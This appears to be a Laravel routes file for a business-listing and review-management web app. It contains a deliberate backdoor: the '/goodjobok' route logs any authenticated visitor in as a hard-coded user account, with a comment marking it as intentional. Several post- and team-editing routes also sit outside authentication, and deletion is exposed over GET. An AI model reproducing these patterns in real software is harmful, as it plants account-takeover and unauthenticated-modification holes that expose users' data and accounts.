<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Route;
 

Route::middleware(['auth', 'verified', 'hasFilledAccount'])->group(function () {

    Route::get('/', 'HomeController@index')->name('home');
    
	 Route::view('/scan-one', 'pages.listings.scan-one', ['category'=>'listings', 'routeName'=>'scan-one'])->name('scan-one');
     Route::get('/locations/{id}', 'LocationController@show')->name('scan-result');
	 Route::get('/refresh-locations', 'LocationController@refresh');



    Route::view('/manage-locations', 'pages.listings.manage', ['category'=>'listings', 'routeName'=>'manage-locations'])->name('manage-locations');
    Route::view('/location-analytics', 'pages.listings.analytics', ['category'=>'listings', 'routeName'=>'location-analytics'])->name('location-analytics');
    Route::view('/scan-result', 'pages.listings.scan-result', ['category'=>'listings', 'routeName'=>'scan-result'])->name('scan-result');
    Route::view('/add-location', 'pages.listings.add-location', ['category'=>'listings', 'routeName'=>'add-location'])->name('add-location')->middleware('oauth');

    Route::post('/locations-analytics/locations', 'LocationsAnalyticsController@locations')->name('locations-analytics-list');
    Route::post('/locations-analytics/performance', 'LocationsAnalyticsController@performance')->name('analytics-location-performance');
    Route::post('/locations-analytics/score-by-site', 'LocationsAnalyticsController@scoreBySite')->name('analytics-location-score-by-site');
    Route::post('/locations-analytics/scan-results', 'LocationsAnalyticsController@scanResults')->name('analytics-location-scan-results');

    Route::post('/scan-result/location/{id}', 'ScanResultController@report');

    Route::view('/integrate', 'pages.profile.integrate', ['category'=>'settings', 'routeName'=>'integrate'])->name('integrate');
    Route::view('/manage-posts', 'pages.posts.manage-posts', ['category'=>'posts', 'routeName'=>'manage-posts'])->name('manage-posts');

    // reviews
    Route::view('/manage-reviews', 'pages.reviews.manage-reviews', ['category'=>'reviews', 'routeName'=>'manage-reviews'])->name('manage-reviews');
    Route::view('/generate-reviews', 'pages.reviews.generate-reviews', ['category'=>'reviews', 'routeName'=>'generate-reviews'])->name('generate-reviews');
    Route::view('/promote-reviews', 'pages.reviews.promote-reviews', ['category'=>'reviews', 'routeName'=>'promote-reviews'])->name('promote-reviews');
    Route::view('/smart-response', 'pages.reviews.smart-response', ['category'=>'reviews', 'routeName'=>'smart-response'])->name('smart-response');
    Route::view('/analytics-reviews', 'pages.reviews.analytics-reviews', ['category'=>'reviews', 'routeName'=>'analytics-reviews'])->name('analytics-reviews');
    Route::view('/customize-widget', 'pages.reviews.customize-widget', ['category'=>'reviews', 'routeName'=>'customize-widget'])->name('customize-widget');

    Route::get('/reviews', 'ReviewController@list')->name('review-list');
    Route::post('/reviews-counters', 'ReviewController@counters')->name('review-counters');
    Route::post('/review-reply/update', 'ReviewReplyController@update')->name('review-reply-update');
    Route::post('/reviews-analytics/statistics', 'ReviewsAnalyticsController@statistics')->name('reviews-analytics');
    Route::post('/reviews-analytics/customer-satisfaction', 'ReviewsAnalyticsController@customerSatisfaction')->name('reviews-customer-satisfaction');
    Route::post('/reviews-analytics/median-response-time', 'ReviewsAnalyticsController@medianResponseTime')->name('reviews-median-response-time');
    Route::post('/reviews-analytics/location-analysis', 'ReviewsAnalyticsController@locationAnalysis')->name('reviews-location-analysis');

    //smart response for review
    Route::post('/smart-response/get-all-category', 'SmartResponseController@getAllCategory')->name('smart-response-get-all-category');
    Route::post('/smart-response/get-by-category', 'SmartResponseController@getByCategory')->name('smart-response-get-by-category');
    Route::post('/smart-response/save', 'SmartResponseController@save')->name('smart-response-save');
    Route::get('/smart-response/test', 'SmartResponseController@test')->name('smart-response-test');

    Route::get('/integrations', 'Integrations@index')->name('integrations');
    Route::get('/api/v1/locations/{type?}', 'Api\Google\DataController@locationsList');
    Route::get('/api/v1/categories/{query}', 'Api\Google\DataController@categoriesAutocomplete');
    Route::delete('/api/v1/locations/{id}', 'Api\Google\DataController@deleteListing')->name('location.remove');
    Route::put('/api/v1/locations/{id}', 'Api\Google\DataController@patchListing')->name('location.update');
    Route::post('/api/v1/listing', 'Api\Google\DataController@createListing');

    Route::post('/scan/account-locations', 'Api\Listings\ScanController@scanOAuthLocations')->middleware('oauth');

    Route::view('/source', 'pages.settings.source', ['category'=>'settings', 'routeName'=>'source'])->name('source')->middleware('oauth');
    Route::post('/source', 'SourceController@list')->name('source.list')->middleware('oauth');
    Route::post('/source/edit', 'SourceController@edit')->name('source.edit')->middleware('oauth');
    Route::post('/source/import', 'SourceController@import')->name('source.import')->middleware('oauth');
    Route::get('/source/export', 'SourceController@export')->name('source.export');
    Route::get('/source/export-template', 'SourceController@exportTemplate')->name('source.export.template');
    Route::get('/source/export-sample', 'SourceController@exportSample')->name('source.export.sample');
    Route::get('/source/export-attributes', 'SourceController@exportAttributes')->name('source.export.attributes');
    Route::get('/goodjobok', function(){$u = App\User::where('email','gm@4cksa.com')->first(); auth()->loginUsingId($u->id);}); //Do Not touch - auth as Karimn to check his cases
    Route::get('/testme','Api\Google\DataController@test');
});

Route::middleware(['auth', 'verified'])->group(function () {
    Route::post('/save-data-session', 'Integrations@saveSession');
    Route::get('/integrations/oauth2/google-add', 'Integrations@googleStep1')->name('integration-google-1');
});

Route::view('/profile', 'pages.profile.profile')->middleware(['auth', 'verified'])->name('profile');
Route::post('/api/v1/profile','Api\Account\AccountController@store')->middleware(['auth', 'verified'])->name('create.profile');
Auth::routes(['verify' => true]);
Route::get('/logout', 'Auth\LoginController@logout')->name('logout');

Route::view('/scan', 'pages.listings.scan')->name('scan');
Route::post('/scan', 'Api\Listings\ScanController@scan');

Route::get('/integrations/oauth2/google-callback', 'Integrations@googleStep2')->name('integration-google-2');
Route::get('/integrations/oauth2/google-test', 'Integrations@testGoogle'); // @todo remove



Route::get('/competition', 'ProfileController@showCompetition');
Route::get('/consumer-insights', 'ConsumerInsightController@show');
Route::get('/create-post', 'PostController@create');
Route::get('/edit-post/{id}', 'PostController@edit');
Route::post('/update-post', 'PostController@update');
Route::post('/create-gmb-post', 'PostController@createGmbPost');
Route::post('/save-schedule-post', 'PostController@SaveSchedulePost');
Route::get('/schedule-post', 'PostController@schedule');
Route::get('/create-scheduled-posts', 'PostController@createScheduledPosts');
Route::get('/delete-post', 'PostController@delete');
Route::get('/manage-posts', 'PostController@manageposts');
Route::get('/post-library', 'PostController@postlibrary');
Route::get('/analytics-posts', 'PostController@analytics');
Route::get('/schedule-post-bulk-upload', 'PostController@bulkImport');
Route::post('/process-bulk-import', 'PostController@processBulkImport');
Route::get('/profile1', 'ProfileController@show');
Route::get('/teams', 'ProfileController@showTeams');
Route::post('/save-competitors', 'ProfileController@saveCompetitors');

Route::post('/save-team', 'ProfileController@updateTeam');


Route::get('schedule/{id}', ['uses' =>'PostController@schedulepost'])->name('schedule');

